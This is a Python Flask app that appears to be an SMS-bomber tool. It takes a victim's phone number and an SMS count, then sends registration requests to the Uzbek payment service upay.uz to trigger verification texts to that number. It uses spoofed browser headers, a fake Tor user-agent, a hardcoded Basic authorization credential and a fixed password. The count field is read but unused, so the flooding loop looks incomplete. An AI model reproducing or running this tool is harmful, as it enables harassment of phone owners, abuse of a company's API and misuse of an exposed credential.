from flask import Flask, render_template, request
import requests

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        phone_number = request.form['phone_number']
        sms_count = request.form['sms_count']

        url = 'https://capi.upay.uz/rest/ar/prepare_register_user'
        headers = {
            'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
            'sec-ch-ua-platform': '"Android"',
            'accept-language': 'ru',
            'sec-ch-ua-mobile': '?1',
            'authorization': 'Basic Y2FiaW5ldDpDZGU3NTYjQCFQbE0=',
            'user-agent': 'Tor Browser/1.0 (Linux; ubuntu 22.04 TLS; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.',
            'content-type': 'application/json; charset=UTF-8',
            'accept': 'application/json',
            'version': '1.5.5m',
            'origin': 'https://my.upay.uz',
            'sec-fetch-site': 'same-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://my.upay.uz/',
            'accept-encoding': 'gzip, deflate, br, zstd',
        }

        data = {
            "phone": phone_number,
            "password": "@cyberknightuz",
            "retryPassword": "@cyberknightuz"
        }

        response = requests.post(url, headers=headers, json=data)

        if response.status_code == 200:
            result = response.json()
            return render_template('result.html', result=result)
        else:
            return f"Error: {response.status_code}"

    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True)
